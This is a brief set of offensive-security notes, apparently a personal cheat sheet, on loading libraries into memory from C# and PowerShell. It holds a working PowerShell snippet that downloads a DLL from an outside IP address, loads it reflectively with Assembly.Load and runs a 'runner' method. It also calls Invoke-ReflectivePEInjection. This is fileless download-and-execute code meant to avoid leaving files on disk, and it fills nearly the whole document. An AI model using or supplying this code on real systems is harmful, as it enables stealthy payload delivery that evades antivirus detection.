


## Csharp -> loadlibrary 


## Powershell -> loadLibrary not in the disk and in the memeory

Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1

Invoke-ReflectivePEInjection





$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.43.140:9999/ClassLibrary1.dll ') 
$assem = [System.Reflection.Assembly]::Load($data) 
$class = $assem.GetType("ClassLibrary1.Class1") 
$method = $class.GetMethod("runner") $method.Invoke(0, $null)
